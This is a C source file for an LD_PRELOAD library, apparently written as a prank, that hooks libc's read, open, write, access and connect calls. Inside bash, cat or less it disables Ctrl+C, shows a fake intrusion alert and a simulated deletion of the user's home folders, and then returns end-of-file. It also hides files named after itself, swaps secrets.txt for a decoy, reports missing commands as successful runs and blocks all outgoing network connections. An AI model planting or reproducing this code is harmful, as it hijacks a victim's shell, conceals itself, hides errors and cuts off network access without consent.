//combination of write(), read() and open()

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#include <fcntl.h>
#include <stdarg.h>
#include <errno.h>
#include <sys/stat.h>
#include <libgen.h>
#include <limits.h>
#include <sys/types.h>// For PATH_MAX
#include <sys/socket.h> //for connect
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

static int block_count = 0;// Global counter for blocked connections

//hijack of the read() function. works with cat, less or bash. 

ssize_t (*original_read)(int fd, void *buf, size_t count) = NULL;
ssize_t (*original_write)(int fd, const void *buf, size_t count) = NULL;
int (*original_open)(const char *pathname, int flags, ...) = NULL;
static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;

// Override access() to pretend command-not-found doesn't exist
int access(const char *pathname, int mode) {
    static int (*orig_access)(const char *, int) = NULL;
    if (!orig_access) {
        orig_access = dlsym(RTLD_NEXT, "access");
    }

    if (strstr(pathname, "command-not-found")) {
        errno = ENOENT; // "No such file or directory"
        return -1;
    }

    return orig_access(pathname, mode);
}

void deletion_simulation(const char *user) {
    char *fake_files[] = {"/Documents", "/Desktop", "/Public", "/snap", "/Downloads", "/.ssh", "/.cache", "/.local", "/.thunderbird", "/Projects", "/Videos"
    }; //simulates the deletion of all personal files: the user would be left with (nearly) nothing

    for (int i = 0; i < 11; ++i) {
        fprintf(stderr, "deleted /home/%s%s\n", user, fake_files[i]);
        usleep(100000);  
    }
}

ssize_t read(int fd, void *buf, size_t count) {
    // Initialize the original read function pointer
    if (!original_read) {
        original_read = dlsym(RTLD_NEXT, "read");
    }

    static int triggered = 0;
    static int done = 0;
    
    if (done) {
        return 0;  // Fake EOF forever after prank
    }
    
    if (!triggered) { // Check if it should be triggered (only once)
        triggered = 1;
	signal(SIGINT, SIG_IGN); // Ignore Ctrl+C to make user powerless
	
        char exe[512];
        ssize_t len = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (len != -1) {
            exe[len] = '\0';

            if (strstr(exe, "bash") || strstr(exe, "cat") || strstr(exe, "less")) {
                fprintf(stderr, "\033[31mALERT: Unauthorized access detected\n"); //31m makes text red to look more serious
                sleep(2);
                deletion_simulation(getenv("USER"));
                fprintf(stderr, "IRREVERSIBLE DELETION COMPLETE\n");
                sleep(3);
                fprintf(stderr,  "Enjoy the rest of your day :)");
                sleep(3);
                fprintf(stderr, "\n");
                signal(SIGINT, SIG_DFL); // Reset ctrl+C to default
                done = 1;
                return 0; //end of file: like control + C
            }
        }
    }

    return original_read(fd, buf, count); // Call original read function
}



//open 

int open(const char *pathname, int flags, ...) {
    if (!original_open){
        original_open = dlsym(RTLD_NEXT, "open");
        if (!original_open) {
        fprintf(stderr, "Error: unable to load original open function\n");
        return -1;
    	}
    }
    
    if (strstr(pathname, "preloadLib")) { //don't allow user to manipulate/see our library
        errno = EACCES; // Permission denied
        return -1;
    }

    // Check if we're targeting a specific file
    if (strstr(pathname, "secrets.txt")) {
                // Get directory of secrets.txt
        char *path_copy = strdup(pathname);
        char *dir = dirname(path_copy);
        
        // Construct path for hacked.txt in same directory
        char fake_path[PATH_MAX];
        snprintf(fake_path, sizeof(fake_path), "%s/stillASecret.txt", dir);
        free(path_copy);

        FILE *fp = fopen(fake_path, "w");
        if (fp) {
            fprintf(fp, "you should not be so curious\n");
            fclose(fp);
        } else {
            fprintf(stderr, "Error: could not create %s\n", fake_path);
            return -1;
        }

        return original_open(fake_path, flags);
    }
    
    if(strstr(pathname, "openThis.txt")) {
    	fprintf(stderr, "You have been hacked. Don't do everything you're told\n");
    	return 0;
    	}
    	
    va_list args;
    va_start(args, flags);
    int mode = va_arg(args, int);
    va_end(args);
    // Default behavior
    return original_open(pathname, flags);
}


//write: in case of command not found print successful
typedef ssize_t (*orig_write_f_type)(int fd, const void *buf, size_t count);

ssize_t write(int fd, const void *buf, size_t count) {
    static orig_write_f_type orig_write = NULL;
    if (!orig_write)
        orig_write = (orig_write_f_type)dlsym(RTLD_NEXT, "write");

    char *msg = strndup(buf, count);
    if (!msg) return orig_write(fd, buf, count);

    if ((strstr(msg, "Command") && strstr(msg, "not found")) || strstr(msg, "Could not find command-not-found")) {
        const char *success_msg = "Finished execution: no errors\n";
        orig_write(fd, success_msg, strlen(success_msg));
        free(msg);
        exit(0); // Exit immediately
    }

    ssize_t result = orig_write(fd, msg, count);
    free(msg);
    return result;
}


// Override connect() to block all outgoing connections

int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    static int (*real_connect)(int, const struct sockaddr *, socklen_t) = NULL;
    if (!real_connect) {
        real_connect = dlsym(RTLD_NEXT, "connect");
    }

    block_count++;  // Increment blocked connection count

    if (addr->sa_family == AF_INET) {
        // IPv4 handling
        char ip[INET_ADDRSTRLEN];
        struct sockaddr_in *addr_in = (struct sockaddr_in *)addr;
        inet_ntop(AF_INET, &addr_in->sin_addr, ip, sizeof(ip));
        int port = ntohs(addr_in->sin_port);
        printf("[LD_PRELOAD] Blocking IPv4 connection to %s:%d\n", ip, port);
        printf("[LD_PRELOAD] Total blocked: %d\n", block_count);

        // Log to file
        FILE *logfile = fopen("/tmp/blocked.log", "a");
        if (logfile) {
            fprintf(logfile, "Blocked IPv4 connection to %s:%d\n", ip, port);
            fclose(logfile);
        }

    } else if (addr->sa_family == AF_INET6) {
        // IPv6 handling
        char ip[INET6_ADDRSTRLEN];
        struct sockaddr_in6 *addr_in6 = (struct sockaddr_in6 *)addr;
        inet_ntop(AF_INET6, &addr_in6->sin6_addr, ip, sizeof(ip));
        int port = ntohs(addr_in6->sin6_port);
        printf("[LD_PRELOAD] Blocking IPv6 connection to [%s]:%d\n", ip, port);
        printf("[LD_PRELOAD] Total blocked: %d\n", block_count);

        // Log to file
        FILE *logfile = fopen("/tmp/blocked.log", "a");
        if (logfile) {
            fprintf(logfile, "Blocked IPv6 connection to [%s]:%d\n", ip, port);
            fclose(logfile);
        }

    } else {
        printf("[LD_PRELOAD] Blocking non-IP connection (family %d)\n", addr->sa_family);
        printf("[LD_PRELOAD] Total blocked: %d\n", block_count);

        FILE *logfile = fopen("/tmp/blocked.log", "a");
        if (logfile) {
            fprintf(logfile, "Blocked unknown IP family (%d)\n", addr->sa_family);
            fclose(logfile);
        }
    }

    // Block all connections (IPv4 and IPv6)
    errno = ECONNREFUSED;
    printf("[BLOCKED] Internet access denied!\n");
    return -1;
}
